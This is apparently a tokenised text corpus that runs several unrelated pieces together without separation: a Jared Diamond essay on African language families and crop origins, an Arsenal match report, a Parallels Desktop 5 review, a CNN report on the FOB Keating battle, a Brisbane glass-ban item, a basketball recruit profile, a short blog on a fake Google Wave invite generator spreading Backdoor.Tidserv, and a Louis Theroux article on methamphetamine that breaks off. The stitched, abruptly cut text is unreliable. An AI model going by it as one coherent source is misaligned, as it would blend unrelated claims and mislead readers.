Afro-Asiatic languages , however , are spoken by a wide variety of both whites and blacks .
The language of Madagascar belongs to yet another , non-African category , the Austronesian language family .
What about the Pygmies ?
They 're the only one of Africa 's five races that lacks a distinct language : each band of Pygmies speaks the language of its neighboring black farmers .
If you compare a given language as spoken by Pygmies with the same language as spoken by blacks , however , the Pygmy version contains unique words and , sometimes , distinctive sounds .
That makes sense , of course : originally the Pygmies , living in a place as distinctive as the equatorial African rain forest , must have been sufficiently isolated to develop their own language family .
Today , however , those languages ' disappearance and the Pygmies ' highly fragmented distribution both suggest that the Pygmy homeland was engulfed by invading black farmers .
The remaining small bands of Pygmies adopted the invaders ' languages , with only traces of their original languages surviving in a few words and sounds .
The distribution of Khoisan languages testifies to an even more dramatic engulfing .
Those languages are famously unique — they 're the ones that use clicks as consonants .
All the existing Khoisan languages are confined to southern Africa , with two exceptions : the click - laden Hadza and Sandawe languages spoken in Tanzania , some 1,500 miles from their nearest linguistic kin .
In addition , clicks have made it into a few of the Niger - Congo languages of southern Africa , such as Zulu and Xhosa ( which is the language of Nelson Mandela ) .
Clicks or Khoisan words also appear in two Afro-Asiatic languages spoken by blacks in Kenya , stranded even farther from the Khoisan peoples of today than are the Hadza and Sandawe speakers of Tanzania .
All this suggests that Khoisan languages and peoples formerly extended far north into Africa until the Khoisan , like the Pygmies , were engulfed by the blacks , leaving behind only a linguistic legacy to testify to their former presence .
Perhaps the most important discovery from linguistic sleuthing , however , involves the Niger - Congo language family , which today is spread all over West Africa and most of subequatorial Africa .
Its current enormous range seems to give no clue as to precisely where the family originated .
However , Greenberg has pointed out that the Bantu languages of subequatorial Africa , once thought to be their own language family , are actually a subfamily of the Niger - Congo language family .
( Technically they 're a sub- sub - sub - sub - sub - sub - sub - sub - sub - subfamily . )
These Bantu languages today account for nearly half of the 1,032 Niger - Congo languages , and Bantu speakers account for more than half ( nearly 200 million ) of the Niger - Congo speakers .
Yet all 494 Bantu languages are so similar to one another that they 've been facetiously described as 494 dialects of a single language .
There are some 170 other such Niger - Congo subfamilies , most of which are crammed into West Africa , a small fraction of the entire Niger - Congo range .
Even the most distinctive Bantu languages , as well as the Niger - Congo languages most closely related to Bantu , are concentrated there , in a tiny area of Cameroon and adjacent east and central Nigeria .
From Greenberg 's evidence it seems obvious that the Niger - Congo language family arose in West Africa , while the Bantu subfamily arose at the east end of that range , in Cameroon and Nigeria , and then spread out over most of subequatorial Africa .
That spread must have begun sufficiently long ago that the ancestral Bantu language had time to split into 494 daughter languages , but nevertheless recently enough that all those daughter languages are still very similar to one another .
Since all Niger - Congo speakers — including the Bantu speakers — are black , it would be nearly impossible to infer who migrated in which direction just from the evidence of physical anthropology .
To make this type of linguistic reasoning clear , let me give you an example : the geographic origins of the English language .
Today the largest number of people whose first language is English live in North America , with others scattered over the globe in Britain , Australia , New Zealand , and other countries .
If we knew nothing else about language distribution and history , we might have guessed that the English language arose in North America and was carried overseas by colonists .
But we know better : we know that each of those countries has its own English dialect and that all those English dialects make up just one subgroup of the Germanic language family .
The other subgroups — the various Scandinavian , German , and Dutch languages — are crammed into northwestern Europe .
Frisian , the Germanic language most closely related to English , is stuck in a tiny coastal area of Holland and western Germany .
Hence a linguist would immediately deduce — correctly — that the English language arose on the northwestern coast of Europe and spread around the world from there .
Essentially the same reasoning tells us that the nearly 200 million Bantu - speaking people now flung over much of the map of Africa arose in Cameroon and Nigeria .
Thus linguistics tells us not only that the Pygmies and the Khoisan , who formerly ranged widely over the continent , were engulfed by blacks ; it also tells us that the blacks who did the engulfing were Bantu speakers .
But what it can't tell us is what allowed the Bantu speakers to displace the Pygmies and Khoisan .
To answer that question we need to look at a different type of surviving evidence , that of domesticated plants and animals .
Why is this evidence so crucial ?
Because farming and herding yield far more calories per acre than does hunting wild animals or gathering wild plants .
As a result , population densities of farmers and herders are typically at least ten times those of hunter - gatherers .
That 's not to say that farmers are happier , healthier , or in any way superior to hunter - gatherers .
They are , however , more numerous .
And that alone is enough to allow them to kill or displace the hunter - gatherers .
In addition , human diseases such as smallpox and measles developed from diseases plaguing domestic animals .
The farmers eventually become resistant to those diseases , but hunter - gatherers do n't have the opportunity .
So when hunter - gatherers first come into contact with farmers , they tend to die in droves from the farmers ' diseases ( see " The Arrow of Disease , " October 1992 ) .
Finally , only in a farming society — with its stored food surpluses and concentrated villages — do people have the chance to specialize , to become full - time metalworkers , soldiers , kings , and bureaucrats .
Hence the farmers , and not the hunter - gatherers , are the ones who develop swords and guns , standing armies , and political organization .
Add that to their sheer numbers and their germs , and it 's easy to see how the farmers in Africa were able to push the hunter - gatherers aside .
But where in Africa did domesticated plants and animals first appear ?
What peoples , by accident of their geographic location , inherited those plants and animals and thereby the means to engulf their geographically less - endowed neighbors ?
When Europeans reached sub-Saharan Africa in the 1400s , Africans were growing five sets of crops .
The first set was grown only in North Africa , extending as far as the highlands of Ethiopia .
North Africa 's rain falls mostly in the winter months — the region enjoys a Mediterranean climate — so all its original crops are adapted to germinating and growing with winter rains .
Archeological evidence tells us that such crops — wheat , barley , peas , beans , and grapes , to name a few — were first domesticated in the Middle East around 10,000 years ago .
So it makes sense that they would have spread into climatically similar and adjacent areas of North Africa , laying the foundation for the rise of ancient Egyptian civilization .
Indeed , these crops are familiar to us precisely because they also spread into climatically similar and adjacent areas of Europe — and from there to America and Australia — and became some of the staple crops of temperate - zone agriculture around the world .
There 's little rain and little agriculture in the Sahara , but just south of the desert , in the Sahel zone , the rain returns .
The Sahel rains , however , fall in the summer .
So even if winter - rain - adapted Middle Eastern crops could somehow have crossed the Sahara , it would still have been hard to grow them in the summer - rain Sahel zone .
Instead , here the Europeans found the second and third sets of African crops , both of which are adapted to summer rains and the area 's less variable day length .
Set number two is made up of plants whose ancestors were widely distributed from west to east across the Sahel zone and were probably domesticated there as well .
They include sorghum and pearl millet , which became the staple cereals of much of sub -Saharan Africa , as well as cotton , sesame , watermelon , and black - eyed peas .
Sorghum proved so valuable that it is now grown in hot , dry areas on all the continents .
The wild ancestors of the third set of African crops are found only in Ethiopia and were probably domesticated there .
Indeed , most of them are still grown only there : few Americans have ever tasted Ethiopia 's finger millet beer , its oily noog , its narcotic chat , or its national bread , which is made from a tiny - seeded cereal called teff .
But we all have the ancient Ethiopian farmers to thank for the domestication of a plant we know exceedingly well : the coffee plant , which remained confined to Ethiopia until it caught on in Arabia and then spread around the globe .
The fourth set of African crops was domesticated from wild ancestors in the wet climate of West Africa .
Some of them , including African rice , have remained virtually confined there ; others , such as African yams , eventually spread throughout much of sub-Saharan Africa ; and two , the oil palm and the kola nut , spread to other continents .
West Africans were chewing the caffeine - containing kola nut as a stimulant long before the Coca - Cola Company enticed Americans to drink its extracts .
The plants in the last batch of African crops are also adapted to wet climates .
Bananas , Asian yams , and taro were widespread in sub-Saharan Africa when the Europeans arrived , and Asian rice was well established on the coast of East Africa .
But these crops did n't come from Africa .
They came from Southeast Asia , and their presence in Africa would be astonishing if the presence of Indonesians in Madagascar had n't already alerted us to Africa 's prehistoric Asian connection .
Let 's consider the four indigenous groups of crops .
All four — from North Africa , the Sahel , Ethiopia , and West Africa — came from north of the equator .
No wonder the Niger - Congo speakers , people who also came from north of the equator , were able to displace Africa 's equatorial Pygmies and subequatorial Khoisan peoples .
The Khoisan and the Pygmies were n't unsuited for the farming life ; it was just that southern Africa 's wild plants were unsuitable for domestication .
Even the Bantu and the white farmers , heirs to thousands of years of farming experience , have rarely been able to develop southern Africa 's native plants into food crops .
Because there are so few of them , summarizing Africa 's domesticated animal species is much easier than summarizing its plants .
The list does n't include even one of the big wild mammals for which Africa is famous — its zebras and wildebeests , its rhinos and hippos , its giraffes and Cape buffalo .
The wild ancestors of domestic cattle , pigs , dogs , and house cats were native to North Africa but also to western Asia , so we can't be sure where they were first domesticated .
The rest of Africa 's domestic mammals must have been domesticated somewhere else because their wild ancestors occur only in Eurasia .
Africa 's sheep and goats were domesticated in western Asia , its chickens in Southeast Asia , its horses in southern Russia , and its camels probably in Arabia .
The one exception is the donkey , which is widely believed to have been domesticated in North Africa .
Many of Africa 's food staples and domesticated animals thus had to travel a long way from their point of origin , both inside and outside Africa .
Some people were just luckier than others , inheriting suites of domesticable wild plant and animal species .
We have to suspect that some of the " lucky " Africans parlayed their advantage into an engulfing of their neighbors .
But all the evidence I 've presented thus far — evidence from modern human and language distributions and from modern crops and domestic animals — is only an indirect means to reconstruct the past .
To get direct evidence about who was living where when , and what they were eating or growing , we need to turn to archeology and the things it turns up : the bones of people and their domestic animals , the remains of the pottery and the stone and iron tools they made , and the remains of the buildings they constructed .
This evidence can help explain at least some of the mystery of Madagascar .
Archeologists exploring the island report that Indonesians arrived before A.D. 800 , possibly as early as 300 , and in a full - fledged expedition : the earliest human settlements on Madagascar include the remains of iron tools , livestock , and crops .
This was no small canoeload of fishermen blown off course .
Clues to how this expedition came about can be found in an ancient book of sailors ' directions , the Periplus of the Erythrean Sea , which was written by an anonymous merchant living in Egypt around A.D. 100 .
The merchant describes an already thriving sea trade connecting India and Egypt with the coast of East Africa .
When Islam began to spread after the beginning of the ninth century , Indian Ocean trade became well documented archeologically by copious quantities of Middle Eastern and occasionally even Chinese products such as pottery , glass , and porcelain found in East African coastal settlements .
The traders waited for favorable winds to let them cross the Indian Ocean directly between East Africa and India .
But there was an equally vigorous sea trade from India eastward , to Indonesia .
Perhaps the Indonesian colonists of Madagascar reached India by that route , then fell in with the westward trade route to East Africa , where they joined with Africans and discovered Madagascar .
The union of Indonesians and East Africans appears to live on today in Madagascar 's basically Indonesian language , which contains loan words from coastal Kenyan Bantu languages .
But there 's a problem : there are no corresponding Indonesian loan words in Kenyan languages .
Indeed , there are few Indonesian traces in East Africa besides some musical instruments like the xylophone and the zither and the Indonesian crops discussed earlier .
Is it possible that the Indonesians , instead of taking the easier route to Madagascar via India and East Africa , somehow — incredibly — sailed straight across the Indian Ocean , discovered Madagascar , and only later got plugged into East African trade routes ?
We still do n't know the answer .
The same sorts of archeological evidence found in Madagascar can be found on the African continent itself .
In some cases they can help prove hypotheses that the other evidence could never fully resolve .
For instance , linguistic and population distribution evidence merely suggests that the Khoisan were once widespread in the drier parts of subequatorial Africa .
But archeologists in Zambia , to the north of the modern Khoisan range , have in fact found skulls of people resembling the modern Khoisan , as well as stone tools resembling those the Khoisan peoples were making in southern Africa when the Europeans arrived .
There are , of course , cases in which archeology can't help .
We assume from indirect evidence that Pygmies were once widespread in the wet rain forest of central Africa , but it 's difficult for archeologists to test this assumption : although they 've found artifacts to show that people were there , they have yet to discover ancient human skeletons .
Archeology also helps us determine the actual dates and places for the rise of farming and herding in Africa , which , as I 've said , is the key to understanding how one group of people was able to conquer the whole continent .
Any reader steeped in the history of Western civilization would be forgiven for assuming that African food production began in ancient Egypt 's Nile Valley , land of pharaohs and pyramids .
After all , by 3000 B.C. , Egypt was undoubtedly the site of Africa 's most complex society .
Yet the earliest evidence for food production in Africa comes not from the Nile Valley but from , believe it or not , the Sahara .
Archeologists are able to say this because they have become expert at identifying and dating plants from remains as fragmentary as charred seeds recognizable only under a microscope .
Although today much of the Sahara is so dry that it can't even support grass , archeologists have found evidence that between 9000 and 4000 B.C. the Sahara was more humid ; there were numerous lakes , and the desert teemed with game .
The Saharans tended cattle and made pottery , then began to keep sheep and goats ; they may even have started to domesticate sorghum and millet .
This Saharan pastoralism began well before food production got its start in Egypt , in 5200 B.C. , when a full package of western Asian winter crops and livestock arrived .
Farming then spread to West Africa and Ethiopia .
By around 2500 B.C. cattle herders had already crossed the modern border of Ethiopia into northern Kenya .
Linguistics offers another way to date the arrival of crops : by comparing words for crops in related modern languages that diverged from each other at various times in the past .
It thus becomes clear , for instance , that the people who were domesticating sorghum and millet in the Sahara thousands of years ago spoke languages ancestral to modern Nilo - Saharan languages .
Similarly , the people who first domesticated the wet - country crops of West Africa spoke languages ancestral to the modern Niger - Congo languages .
The people who spoke ancestral Afro-Asiatic languages were certainly involved in the introduction of Middle Eastern crops into North Africa and may have been responsible for the domestication of crops native to Ethiopia .
Analyzing the names of crops leaves us with evidence that there were at least three ancestral languages spoken in Africa thousands of years ago : ancestral Nilo - Saharan , Niger - Congo , and Afro -Asiatic .
And other linguistic evidence points to an ancestral Khoisan language ( that evidence , however , does n't come from crop names , since the ancestral Khoisan people did n't domesticate any crops ) .
Surely , since Africa harbors 1,500 languages today , it was big enough to harbor more than four ancestral languages in the past .
But all those other languages must have disappeared , either because the peoples speaking them lost their original languages , as the Pygmies did , or because the peoples themselves disappeared .
Wenger 's men still lacking the spark of recent outings ...
By Tim Collings
Never mind the quality , read the result .
It was one of those nights for Arsene Wenger and his men as their fluency , in their best spells , was not rewarded and they failed to touch the heights they reached only a few weeks ago .
Most importantly Arsenal secured their place in the knockout stages of the Champions League with this victory , but there was no command performance from Carlos Vela as the latest man to audition for Robin van Persie 's role as centre - forward .
Nor did anyone other than , predictably , Cesc Fabregas truly impress for Arsenal as they seemed to lose their way after a high - tempo opening spell and two splendidly - taken and struck goals by Samir Nasri and Denilson , both with venom and accuracy .
Liege did not lie down and dream of their Christmas shopping , as some visitors to the Emirates Stadium have done in the past , but instead raised the spirits - and Arsenal 's alarm at times - with their willingness to counter - attack .
They twice hit the woodwork and on another night might have stolen a result .
But their survival was a tribute above all to the excellence of their goalkeeper Sinan Bolat who at times produced almost miraculous heroics to keep Arsenal out .
His string of first half saves was enough for some keepers in a month 's work .
In the end , he was beaten by a goal that followed a defensive error when Landry Mulemo slipped to gift Nasri an opening and then a spectacular 25 - metre ' whirler ' from Denilson that swept in under the bar .
To Standard 's credit , they were not undone in open play and stood their ground even if they could not produce football to compare with Arsenal 's best .
Denilson 's goal was the highlight and his performance was the bonus for Wenger in a week when he needs to see his team regain their spark ahead of Sunday 's Premier League clash with Chelsea .
The Brazilian slotted back into midfield alongside Song , the pair providing a shield behind the roving Fabregas , and looked as if he had never been away .
His composure , reading of the game and calm , simple passing helped the team tick over in midfield where Standard did their best to break up the fluency that characterises Arsenal at their best .
Oddly , they played their best football in the opening 20 minutes without reward and then produced their most dangerous moments from set pieces - very non-Arsenal .
But , as all Gunners fans would say , it was the result that counted on a night when William Gallas and Andrey Arshavin spilt blood - each others of course , in their enthusiasm to head a goal - and Kieran Gibbs finished the evening limping off after taking another kick on his right foot .
The real contest , after all , was not this one but the upcoming clash with Chelsea on Sunday .
I 'm virtually exhausted .
After last week 's review of VMWare Fusion 3 and this week 's review of Parallels Desktop 5 , it 's been a weird couple of weeks .
I 'm having this recurring virtualization nightmare where a penguin wants to share something with me but can't .
Then Windows Aero calls to me in a fuzzy voice like that teacher from Charlie Brown .
But you 're not here to read about my dreams .
On to the task at hand : the fifth release of well - known Mac virtualization package , Parallels Desktop .
With version 4 of Parallels Desktop having come out less than a year ago , a lot of existing users are wondering what , other than official Windows 7 support , makes version 5 worth the $ 49.99 upgrade .
Excluding the token interface tweaks , the main features in 5 break down like this :
Windows Aero WDDM driver support for Vista and Windows 7
Multi-monitor support for Full Screen and Coherence / Crystal modes
DirectX 9.0 c with Shader Model 3 support
OpenGL 2.1 support for Linux client VMs
Gesture support for laptop trackpads
Crystal window mode and MacLook interface option
That 's really not a long list , and the documentation 's " What 's New " section does feel more padded than most .
The bigger concern , given the short development time for these features , is whether the new stuff has been put through the necessary testing with OS X 10.6 .
It was no secret that version 4 had many problems on release , and Parallels Desktop 5 did seem to drop out of the sky and onto our desks .
There was n't an open public beta , so no one really knew what to expect .
Has Parallels learned from its past mistakes , or is this another potentially great release buried under a mound of bugs ?
Read on to find out .

My shared networking was n't working even though the host machine 's Airport connection was fine .
After changing Parallels to bridged networking mode , it worked fine and I could make Interwebs .
A lot of people are reporting that they are getting BSODs ( blue screens of death ) with their Windows VMs after upgrading the Parallels application .
If that 's you , the fix is as follows :
Shut down your virtual machine .
Set the virtual machine CPU number to 1 in VM configuration .
To do this , open Virtual Machine menu-> Configure ... and set " 1 " in " Processors " drop - down .
Start the virtual machine .
This time it will boot normally .
Login and wait until Parallels Tools are installed .
After Parallels
Tools are installed , it is safe to return the previous CPU amount .
After that , you should be good to go .
Interface changes
I think the secret is out that Mac users like their interface doohickies .
Parallels Desktop , always the big player in the Mac interface integration game , has introduced two more interface features to sate the Mac - heads who feel guilty for running Windows .
Version 5 now has a total of five window modes : Windowed , Modality , Full Screen , Coherence , Crystal , and an added MacLook option .
Any more than that and I think Parallels Desktop will be the first software program diagnosed with A.D.D .
But seriously folks , let 's take a look at these new options .
Crystal Mode :
As a sort of extension of Coherence mode , which remains , Crystal takes seamlessness to another level by completely doing away with the Parallels application menu and putting everything you need in the Dock and Mac OS menu bar .
For those confused hip - hop producers out there , Crystal mode is not to be confused with Cristal mode , which means “ both drunk and jiggy ” :
This one 's for my dead coat .
Since the application - less approach of Crystal mode could leave many users lost if they turned it on by accident , Parallels Desktop gives you clear instructions when you enable it :
Note to Mac developers :
Alt - click should read Option - click .
Once you close that guide , you are free to use Parallels Desktop in its most stealth scheme yet .
A very windows - less Windows experience .
Notice the tiny Parallels icon at the left in the menu bar — that is where everything outside of launching applications is done in Crystal mode .

WASHINGTON ( CNN ) --
The battle Saturday in which eight U.S. troops were killed was so fierce that , at one point , U.S. forces had to fall back as attackers breached the perimeter of their base , a U.S. military official with knowledge of the latest intelligence reports on the incident said .
Forward Operating Base Keating , seen in 2007 , is surrounded by tall ridge lines .

The new revelations about the battle that engulfed Forward Operating Base Keating in Kamdesh District are a further indication of how pinned down and outmanned the troops were at the remote outpost .
The base , in an eastern Afghanistan valley , was surrounded by ridge lines where the insurgents were able to fire down at U.S. and Afghan troops .
The facility had been scheduled to be closed within days , CNN has learned .
The closing is part of a wider effort by the top commander in Afghanistan , Gen. Stanley McChrystal , to cede remote outposts and consolidate troops in more populated areas to better protect Afghan civilians .
The United States now believes that about 200 insurgents -- mostly local fighters , with some Taliban organizers and leaders -- had been planning the attack for days , hiding mortars , rockets and heavy machine guns in the mountains .
Sources said the Taliban may have been watching the troops make preparations to depart and launched their attack at a time of vulnerability .
The Taliban were able to use their higher positions to fire into the base , pinning down the troops .
As the attack progressed , the troops were forced back when enemy fighters managed to breach the outer perimeter of the outpost , the source said .
That led to especially intense fighting that continued until the U.S. troops could again secure the area , several sources said .
The battle erupted about 5 a.m. Saturday and lasted 12 hours , with the most intense fighting going on for about seven hours .
The United States was able to get air support overhead within half an hour of the attacked troops ' call for help , but a series of problems hindered mounting any sustained counterattack .
The source said smoke from a fire lit by the insurgents obscured vision on the ground and in the air , and the narrowness of the valley hobbled any intense close air support .
Instead , Apache helicopters went in waves of two to four , firing at the Taliban fighters .
But return fire frequently forced the helicopters back .
One Apache was hit .
It took hours to evacuate the dead and wounded .
During much of the fight , medical - evacuation helicopters had a hard time getting in because the landing zone was under attack .
Even when the helicopters were able to land , some of the wounded resisting leaving while the battle raged .
Eventually , the tide turned for the U.S. and Afghan troops .
More than 100 militants were killed , according to NATO 's International Security Assistance Force .
Remains of four of the U.S. dead were flown back to Dover Air Force Base on Tuesday morning .

Licensed venues in Brisbane subject to the State Government 's crackdown on glass will not be able to serve patrons bottles of wine and champagne if their establishments are deemed " high risk " .
The government 's plans to force pubs and clubs with a history of glass - related incidents to serve beer and other single drinks over the bar in plastic have been well documented , but the potential ramifications for venues serving wine and champagne by the bottle have not until now been clarified .
A spokesman for Fair Trading Minister Peter Lawlor said yesterday that a total ban on glass meant that venues that remain in the high - risk category after responding to show - cause notices would not be able hand glass of any kind over the bar to customers .
He said high - risk venues would have to find alternatives to glass bottles of wine , regardless of what time of day or in what circumstance the wine was ordered .
Venues that were regarded as low risk may be able to negotiate more flexible terms of their conditioning with Liquor Licensing .
Terrence Jones looks good .
Terrence Jones is the No. 9 recruit in the ESPNU 100 .
Dustin Snipes / Icon SMI
He always looks good on the basketball court .
He is an all - around player -- posting up , flicking shots , sending laser passes in traffic and clearing boards .
With one season left before college , Jones is shifting focus on his game away from the game .
This is n't a makeover -- no , Jones does n't need one anytime soon .
Instead , the 6 - foot - 9 forward from Jefferson High in Portland , Ore. , wants to be more aware of his teammates .
Consider it a comfort zone where banter flows freely and unity is paramount .
" I 'm a senior .
I need to be a leader , " he said .
His proactive approach has been noticeable at Jefferson 's open gyms this fall .
He 's more inclusive , making sure everyone touches the ball .
He feeds the hot hand .
He lauds them for a heads - up play and dishes out criticism for boneheaded moves .
Mostly , he 's a trusted sage for frustrated teammates .
" They 're worried about playing time and if they 'll be on the varsity , " Jones said , softly .
That when his Dear Abby instinct kicks in .
And his advice ?
" It 's a new year .
Coach Strickland views it as a fresh start for all .
Go prove yourself . "
Conversely , Jones is past that stage .
With an 84 - inch wingspan , he is rounding into a complete player , the one college coaches hope will find a home in their program .
" He 's likeable , very coachable , and mostly his teammates love him , " Jefferson coach Pat Strickland said .
Add dedicated and loyal .
Jones , the No. 3 small forward and No. 15 overall in the ESPNU 100 , had a chance to jump .
He could have transferred to a nationally known basketball factory on the East Coast , joining former high school teammate Terrence Ross ( a Maryland recruit ) , but opted to stay at the secondary school located in his North Portland neighborhood .
" There 's nothing more that I have to prove at another school that I could n't do here [ at Jefferson ] , " Jones said .
" My family is here ; that 's really important . "
Family ties
Jones is quite content in Portland but knows the next level will take him elsewhere .
That 's why he savors playing locally .
When the Jefferson Democrats are home , so is Jones ' extended family .
" At least 25 family members at each game come watch me play , " Jones said .
" You ca n't get that kind of love anywhere but at home . "
For Jones , basketball began at home .
When his parents divorced , Jones and his mother , Linda , moved in with his maternal grandmother .
It was there that his aunt , Ava Mashia ( Linda 's sister ) , nurtured a precocious 3 - year - old with the DNA for the game .
Mashia was a scholarship basketball player at the University of Washington and taught him how to play the game , appreciate the talents of Magic Johnson and Michael Jordan , and respect the game .
" My aunt was always way ahead of things , " Jones said .
" When I was too scared to sleep at night , we 'd watch late games on TV .
We collected basketball cards .
She taught [ me ] to dribble and my post - up moves . "
They played one - on - one at Peninsula Park in North Portland , and by the sixth grade , the apprentice defeated his court mentor .
In the eighth grade , Jones was dunking .
He had taken his fledgling game to another stratosphere .
Through it all , there are constants , namely his mother and aunt .
Mashia remains his most discerning critic .
" She 's very knowledgeable about the game and first taught me to shoot over my head , " he said .
" Once the national analysts wrote I did n't have a midrange game , she pointed out , ' I told you this years ago ; start listening to me . ' "
His cousins , Salim and Damon Stoudamire , both have played in the NBA .
Salim is at the Houston Rockets camp while Damon is an assistant coach with the Memphis Grizzlies .
" They want me to understand what it takes to play in the NBA , " Jones said .
" They talk about the workouts and how hard they are . "
Jones ' cousin , Erica Mashia , played at USC and was the Pac - 10 Freshman of the Year for the 1995 - 96 season .
" It 's a great basketball family , " said Strickland .
Recruiting wars
John Calipari , Bill Self , Lorenzo Romar , Ben Howland and Jeff Capel have each been known to saunter into Jefferson 's gymnasium to catch an eyeful and , maybe , the eye of Jones .
Terrence Jones spent the offseason working on his mid-range game .
Chris Williams / Icon SMI
Jones is n't on top of the game when it comes to recruiting .
He does n't necessarily return phone calls promptly or seemingly express interest in any particular school .
He has n't scheduled any official visits , but wants to sign his binding national letter of intent in November .
Strickland said North Carolina and Florida are out of the picture : " They chose to go in another direction ; they did n't know his interest . "
What is known is that Jones has seven schools in the mix : Oregon , Arizona , Kansas , Kentucky , Oklahoma , Washington and UCLA .
Maryland remains on the periphery .
" My goal is to get it done early , " Jones said .
" I 'm working on it . "
Jones is clearly one of the top players in the Class of 2010 and is a shoo - in for the McDonald 's and Jordan Brand All - America Games .
Jones ' Scouts Inc. evaluation says it all : " He is skilled playing with his face to the basket and can put the ball on the floor and create his own shot and has a good feel passing the ball out of the post .
He is a great offensive rebounder who is quick off the floor and pursues the ball relentlessly .
Jones is a smart player on the defensive end , Jones gives good effort , and he can guard all five spots . "
Strickland , who coached Jones with the I - 5 Elite on the summer circuit , watched the maturation of his star player 's game firsthand .
" He 's always up for a challenge ; he wants to help his teammates .
Terrence will guard a big man if he has to .
He just wants to win and improve his game , whatever it takes , " he said .
It was a bountiful summer for Jones , who attended the LeBron James Skills Academy in July and participated in the Nike Global Challenge and the Boost Mobile Elite 24 Game in August .
Jones also helped the I - 5 Elite win the Center Stage Tournament at Las Vegas in July and buoyed the team during the treacherous summertime circuit .
" It was a great summer , " Jones noted .
Three - peat
When the Jefferson Democrats take the floor in December , they will be considered one of the nation 's top teams .
In his first season as head coach , Strickland lead the Demos to their second consecutive Oregon Class 5A state championship , beating Century ( Hillsboro ) 60 - 44 in the final at University of Oregon 's cozy McArthur Court .
Jones saved his best for last , recording a double - double , 27 points and 18 rebounds , as Jefferson snared its fifth overall state title .
The Demos return nine players , including all the starters , and have added key transfers -- notably Noah Kone , a 6 - 7 forward from Vancouver , Wash . , recruited by Pac - 10 and Western Coast Conference schools -- but Jones remains to the go - to guy , said Strickland .
As a junior , he was named the state player of the year , averaging 24 points , 13 rebounds , 5 assists , 3 blocks and 3 steals .
Impressive digits -- but a third straight crown would cap a brilliant career in the Rose City .
" We 're up for the challenge , " Strickland said .
To fulfill that goal , the Demos are ramping up their nonconference schedule .
Strickland said Jefferson will participate in the Les Schwab Invitational , a Portland - area , 16 - team tournament in December with the likes of national heavyweights Oak Hill Academy ( Mouth of Wilson , Va. ) , Westchester ( Los Angeles ) and Rainier Beach ( Seattle ) .
Additionally , he 's booked dates with Poly ( Long Beach , Calif . ) , Castlemont ( Oakland , Calif . ) and Federal Way ( Wash . ) and is awaiting an invite to play at the Bank of America City of Palms Classic , which tips off Dec. 19 in Fort Myers , Fla .
" We want to be nationally ranked , " Jones said .
" If you play good teams and beat them , you 'll be noticed , right ? "
Strickland agrees .
Jefferson last appeared in the final national rankings in 2000 when it finished 28 - 0 after winning the Class 4A title .
That team featured Aaron Miles ( now with the Atlanta Hawks ) .
" Terrence asked to play the best , and we'd like to get noticed by the rankings .
Hopefully we can put Portland basketball on the map with this team , " Strickland added .
Christopher Lawlor has covered high school sports for more than 20 years , most recently with USA Today , where he was the head preps writer responsible for national high school rankings in football , baseball , and boys ' and girls ' basketball .
He also worked for Scholastic Coach magazine , for which he ran the Gatorade National Player of the Year program for nine years .
Lawlor , a New Jersey resident , grew up in Rochester , N.Y. , and is a graduate of St. Bonaventure University .
I guess it had to happen sooner or later .
After looking at who knows how many spam - and - scam occurrences , Patrick Fitzgerald of Symantec has struck gold while investigating the latest malware campaigns he was alerted to .
The campaign in question is simple enough : forum visitors and Twitter users are offered to download an application that supposedly generates invites for Google Wave .
When the user follows the link , he is redirected to a page that contains the wanted file ( googlewaveinvitegenerator.exe ) – which , of course , is not what it should be , but the malicious payload Backdoor .
Tidserv .
And what ’s the difference between this and other similar scams ?
Well , this :
The site allows the download of 4 more files , which combined read like a comprehensive spammer manual .
Without a doubt , this occurrence has to be filed in the FAIL category .
What can you learn from those files ?
You can see what spammers use to generate “ original ” messages and keyword lists :
You can read how they use SEO optimization to achieve top rankings on search engines , and how they trick CAPTCHA .
You can learn how to use Xrumer and Hrefer , two ideal spamming tools .
All in all , a fascinating read that opens a window in to the spammer ’s / scammer ’s mind .
Methamphetamine , aka crystal meth or a host of other names , gives dizzying highs but is acutely addictive and wrecks the body .
So why do people do it , asks Louis Theroux .
" Tempted , Louis ? "
The question came from Chris , a self - confessed meth addict of twenty - something years , as he and I watched his friend Andrew exhale a large plume of smoke .
FIND OUT MORE Louis Theroux : The City Addicted to Crystal Meth is on BBC Two on Sunday , 9 August , at 2100 BST Catch up at BBC iPlayer For several weeks , I 'd been on the trail of the world 's most widely used hard drug .
Methamphetamine goes by many names .
Meth , Ice , Crystal , Tina , Tweak , Go-fast .
In South Africa they call it Tik .
In Thailand , Yaa Baa .
In New Zealand , P . But everywhere its effects are the same - soaring highs that last upwards of eight hours , a sensation of alertness , confidence , and a background note of sexualisation .
Meth users are known for drug binges that can last days , sometimes going a week or more without sleep , during which they 'll talk enthusiastically , play videogames for hours on end , and indulge in reckless sexual behaviour .
But there 's no up without a down , as the old saying goes .
The crash , when it comes , is hard .
The ravaging effects of the drug make for shocking posters
The drug is also - surprise , surprise - quite addictive .
Degenerate meth addicts are known to develop mental problems - paranoia , sometimes even psychotic episodes .
Oh , and there are physical side effects , too .
Massive dental wreckage ( so - called " meth mouth " ) , sores ( occasionally accompanied by the delusion that they are produced by bugs under the skin - " meth mites " ) , precipitous weight loss .
And so on .
I 've been fascinated by the meth phenomenon since reading about it in the nineties .
At that time I was living in America and the drug was generally called crank ( for some reason , thankfully , meth has never got its hooks deeply into the British drug scene ) .
Part of my interest was a morbid fascination with the extremes of behaviour that the drug could incite .
A New York Times article described a man , high on meth and experiencing psychotic delusions while being chased by the police , who chopped off his own son's head and tossed it from the window of his vehicle .
The UK is yet to suffer a chronic problem with the drug
In 2004 I travelled across the US , staying in flea - bag motels .
Meth use was a constant theme in the stories of my fellow guests .
All of them had friends and loved - ones grappling with addiction .
Occasionally I 'd run into someone who was himself high .
One man stuck in my memory - bug-eyed , manic , he was riding an under - sized bicycle and holding a balloon on a string which he'd brought back for his kid to play with - having presumably taken it from a car dealership or a children 's party .
There was something both slightly comic and deeply depressing about his frenetic energy and his apparent sense that he was busily engaged in responsible parenting
Then , in 2007 , I made a documentary about San Quentin prison .
Meth featured overwhelmingly in the stories of the cons .
From my conversations with prisoners I had the impression a drug epidemic was spreading through the lower strata of American society , which was both fuelling and being fuelled by a range of dysfunctional behaviours - crime , sexual abuse , broken families - all of it lubricated by prodigious amounts of meth .
There is an international trade in the drug Late last year I decided to pursue the idea of making a meth documentary .
After some research the production settled on Fresno as our location for the story .
A town of half a million in California 's central valley , Fresno has been on the slide for years .
Joblessness , urban sprawl , social breakdown , it 's got them all , along with - not coincidentally - one of the worst meth problems anywhere in America .
The idea was to try to both trace the contours of the meth problem and attempt to understand the reasons for the prevalence of the drug .
Being illegal , meth use is hard to document and the world of the addicts is not easy to get into .
But one way is via the police .
